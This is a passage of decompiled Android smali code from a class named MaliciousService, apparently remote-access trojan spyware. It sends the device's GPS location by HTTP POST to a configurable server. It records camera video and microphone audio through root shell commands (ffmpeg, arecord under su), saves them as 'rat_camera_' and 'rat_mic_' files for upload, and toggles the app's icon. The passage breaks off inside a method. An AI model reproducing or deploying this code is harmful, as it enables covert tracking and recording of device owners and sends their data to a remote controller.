    const-string v0, "Server IP/Port not loaded or Device ID not ready, cannot send heartbeat."

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 838
    return-void
.end method

.method private sendLocation(Landroid/location/Location;)V
    .registers 10

    .line 390
    const-string v0, "MaliciousService"

    if-eqz p1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    if-eqz v1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    if-eqz v1, :cond_133

    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v1, :cond_12

    goto/16 :goto_133

    .line 394
    :cond_12
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 396
    :try_start_17
    const-string v2, "lat"

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 397
    const-string v2, "lon"

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;
    :try_end_29
    .catch Lorg/json/JSONException; {:try_start_17 .. :try_end_29} :catch_117

    .line 401
    nop

    .line 402
    nop

    .line 404
    const/4 p1, 0x0

    :try_start_2c
    new-instance v2, Ljava/net/URL;

    iget-object v3, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v4, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "http://"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v6, ":"

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/api/location/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 405
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;
    :try_end_64
    .catch Ljava/io/IOException; {:try_start_2c .. :try_end_64} :catch_e1
    .catchall {:try_start_2c .. :try_end_64} :catchall_dd

    .line 406
    :try_start_64
    const-string p1, "POST"

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 407
    const-string p1, "Content-Type"

    const-string v3, "application/json; charset=utf-8"

    invoke-virtual {v2, p1, v3}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 408
    const/4 p1, 0x1

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 409
    const/16 p1, 0x2710

    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 410
    invoke-virtual {v2, p1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 411
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object p1
    :try_end_80
    .catch Ljava/io/IOException; {:try_start_64 .. :try_end_80} :catch_db
    .catchall {:try_start_64 .. :try_end_80} :catchall_110

    .line 412
    :try_start_80
    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v3, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v1, v3}, Ljava/lang/String;->getBytes(Ljava/nio/charset/Charset;)[B

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/io/OutputStream;->write([B)V

    .line 413
    invoke-virtual {p1}, Ljava/io/OutputStream;->flush()V
    :try_end_90
    .catchall {:try_start_80 .. :try_end_90} :catchall_cf

    .line 414
    if-eqz p1, :cond_95

    :try_start_92
    invoke-virtual {p1}, Ljava/io/OutputStream;->close()V

    .line 415
    :cond_95
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result p1

    .line 416
    const/16 v1, 0xc8

    if-ne p1, v1, :cond_b6

    .line 417
    iget-object p1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Location sent successfully for device: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_cc

    .line 419
    :cond_b6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Server responded with non-OK code for location: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_cc
    .catch Ljava/io/IOException; {:try_start_92 .. :try_end_cc} :catch_db
    .catchall {:try_start_92 .. :try_end_cc} :catchall_110

    .line 424
    :goto_cc
    if-eqz v2, :cond_10f

    .line 425
    goto :goto_10c

    .line 411
    :catchall_cf
    move-exception v1

    if-eqz p1, :cond_da

    :try_start_d2
    invoke-virtual {p1}, Ljava/io/OutputStream;->close()V
    :try_end_d5
    .catchall {:try_start_d2 .. :try_end_d5} :catchall_d6

    goto :goto_da

    :catchall_d6
    move-exception p1

    :try_start_d7
    invoke-static {v1, p1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_da
    :goto_da
    throw v1
    :try_end_db
    .catch Ljava/io/IOException; {:try_start_d7 .. :try_end_db} :catch_db
    .catchall {:try_start_d7 .. :try_end_db} :catchall_110

    .line 421
    :catch_db
    move-exception p1

    goto :goto_e4

    .line 424
    :catchall_dd
    move-exception v0

    move-object v2, p1

    move-object p1, v0

    goto :goto_111

    .line 421
    :catch_e1
    move-exception v1

    move-object v2, p1

    move-object p1, v1

    .line 422
    :goto_e4
    :try_start_e4
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Failed to send location for device "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, ": "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_10a
    .catchall {:try_start_e4 .. :try_end_10a} :catchall_110

    .line 424
    if-eqz v2, :cond_10f

    .line 425
    :goto_10c
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 428
    :cond_10f
    return-void

    .line 424
    :catchall_110
    move-exception p1

    :goto_111
    if-eqz v2, :cond_116

    .line 425
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 427
    :cond_116
    throw p1

    .line 398
    :catch_117
    move-exception p1

    .line 399
    invoke-virtual {p1}, Lorg/json/JSONException;->getMessage()Ljava/lang/String;

    move-result-object p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "JSON exception for location: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 400
    return-void

    .line 391
    :cond_133
    :goto_133
    const-string p1, "Location, server config, or device ID is null, not sending."

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 392
    return-void
.end method

.method private showIcon()V
    .registers 4

    .line 713
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 714
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.example.android.MainActivity"

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 715
    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 716
    const-string v0, "MaliciousService"

    const-string v1, "App icon shown."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 717
    return-void
.end method

.method private startLiveCamera()V
    .registers 8

    .line 636
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 637
    const-string v0, "Cannot start camera: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 638
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 639
    return-void

    .line 641
    :cond_11
    const-string v0, "Simulating live camera capture..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 642
    new-instance v0, Ljava/io/File;

    sget-object v2, Landroid/os/Environment;->DIRECTORY_MOVIES:Ljava/lang/String;

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "rat_camera_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".mp4"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 643
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    .line 645
    :try_start_42
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "su"

    const/4 v6, 0x0

    aput-object v5, v4, v6

    const-string v5, "-c"

    const/4 v6, 0x1

    aput-object v5, v4, v6

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "ffmpeg -f v4l2 -i /dev/video0 -vcodec mpeg4 -b 800k -r 30 -s 640x480 -y "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x2

    aput-object v2, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 646
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    move-result v2

    .line 647
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "ffmpeg process exited with code: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 648
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_b7

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v6, v2, v4

    if-lez v6, :cond_b7

    .line 649
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Camera capture started: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 650
    const-string v2, "camera"

    invoke-direct {p0, v0, v2}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_bc

    .line 652
    :cond_b7
    const-string v0, "Camera file not found or empty after capture. Ensure ffmpeg is installed and device has camera access."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_bc
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_bc} :catch_bf
    .catch Ljava/lang/InterruptedException; {:try_start_42 .. :try_end_bc} :catch_bd

    .line 656
    :goto_bc
    goto :goto_da

    .line 654
    :catch_bd
    move-exception v0

    goto :goto_c0

    :catch_bf
    move-exception v0

    .line 655
    :goto_c0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error starting live camera: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 657
    :goto_da
    return-void
.end method

.method private startLiveMic()V
    .registers 8

    .line 660
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 661
    const-string v0, "Cannot start microphone: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 662
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 663
    return-void

    .line 665
    :cond_11
    const-string v0, "Simulating live microphone capture..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 666
    new-instance v0, Ljava/io/File;

    sget-object v2, Landroid/os/Environment;->DIRECTORY_MUSIC:Ljava/lang/String;

    invoke-static {v2}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "rat_mic_"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ".wav"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 667
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    .line 669
    :try_start_42
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    const/4 v4, 0x3

    new-array v4, v4, [Ljava/lang/String;

    const-string v5, "su"

    const/4 v6, 0x0

    aput-object v5, v4, v6

    const-string v5, "-c"

    const/4 v6, 0x1

    aput-object v5, v4, v6

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "arecord -D plughw:1,0 -f cd -t wav -r 44100 -c 2 -d 60 -o "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x2

    aput-object v2, v4, v5

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v2

    .line 670
    invoke-virtual {v2}, Ljava/lang/Process;->waitFor()I

    move-result v2

    .line 671
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "arecord process exited with code: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 672
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_b7

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v2

    const-wide/16 v4, 0x0

    cmp-long v6, v2, v4

    if-lez v6, :cond_b7

    .line 673
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Microphone capture started: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 674
    const-string v2, "mic"

    invoke-direct {p0, v0, v2}, Lcom/example/android/MaliciousService;->uploadFile(Ljava/io/File;Ljava/lang/String;)V

    goto :goto_bc

    .line 676
    :cond_b7
    const-string v0, "Microphone file not found or empty after capture. Ensure audio capture is set up correctly."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_bc
    .catch Ljava/io/IOException; {:try_start_42 .. :try_end_bc} :catch_bf
    .catch Ljava/lang/InterruptedException; {:try_start_42 .. :try_end_bc} :catch_bd

    .line 680
    :goto_bc
    goto :goto_da

    .line 678
    :catch_bd
    move-exception v0

    goto :goto_c0

    :catch_bf
    move-exception v0

    .line 679
    :goto_c0
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error starting live microphone: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 681
    :goto_da
    return-void
.end method

.method private startLocationUpdates()V
    .registers 12

    .line 789
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_e

    .line 790
    const-string v0, "Cannot start location updates: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 791
    return-void

    .line 794
    :cond_e
    :try_start_e
    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_25

    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    .line 795
    invoke-virtual {p0, v0}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_1f

    goto :goto_25

    .line 819
    :cond_1f
    const-string v0, "Location permissions not granted!"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_81

    .line 796
    :cond_25
    :goto_25
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v2, "gps"

    invoke-virtual {v0, v2}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0
    :try_end_2d
    .catch Ljava/lang/SecurityException; {:try_start_e .. :try_end_2d} :catch_82

    const-string v2, "50.0f"

    const-string v3, "120000"

    if-eqz v0, :cond_50

    .line 797
    :try_start_33
    iget-object v4, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v5, "gps"

    .line 799
    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    .line 800
    invoke-static {v2}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v8

    iget-object v9, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 802
    invoke-virtual {v0}, Landroid/os/Handler;->getLooper()Landroid/os/Looper;

    move-result-object v10

    .line 797
    invoke-virtual/range {v4 .. v10}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;Landroid/os/Looper;)V

    .line 803
    const-string v0, "Requested GPS location updates."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_55

    .line 805
    :cond_50
    const-string v0, "GPS provider not enabled."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 807
    :goto_55
    iget-object v0, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v4, "network"

    invoke-virtual {v0, v4}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_7c

    .line 808
    iget-object v4, p0, Lcom/example/android/MaliciousService;->locationManager:Landroid/location/LocationManager;

    const-string v5, "network"

    .line 810
    invoke-static {v3}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v6

    .line 811
    invoke-static {v2}, Ljava/lang/Float;->parseFloat(Ljava/lang/String;)F

    move-result v8

    iget-object v9, p0, Lcom/example/android/MaliciousService;->locationListener:Landroid/location/LocationListener;

    iget-object v0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    .line 813
    invoke-virtual {v0}, Landroid/os/Handler;->getLooper()Landroid/os/Looper;

    move-result-object v10

    .line 808
    invoke-virtual/range {v4 .. v10}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;Landroid/os/Looper;)V

    .line 814
    const-string v0, "Requested Network location updates."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_81

    .line 816
    :cond_7c
    const-string v0, "Network provider not enabled."

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_81
    .catch Ljava/lang/SecurityException; {:try_start_33 .. :try_end_81} :catch_82

    .line 823
    :goto_81
    goto :goto_9d

    .line 821
    :catch_82
    move-exception v0

    .line 822
    invoke-virtual {v0}, Ljava/lang/SecurityException;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SecurityException requesting location updates: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 824
    :goto_9d
    return-void
.end method

.method private stopLiveCamera()V
    .registers 6

    .line 684
    const-string v0, "Stopping live camera capture..."

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 686
    :try_start_7
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const-string v3, "su"

    const/4 v4, 0x0

    aput-object v3, v2, v4

    const-string v3, "-c"

    const/4 v4, 0x1

    aput-object v3, v2, v4

    const-string v3, "pkill ffmpeg"

    const/4 v4, 0x2

    aput-object v3, v2, v4

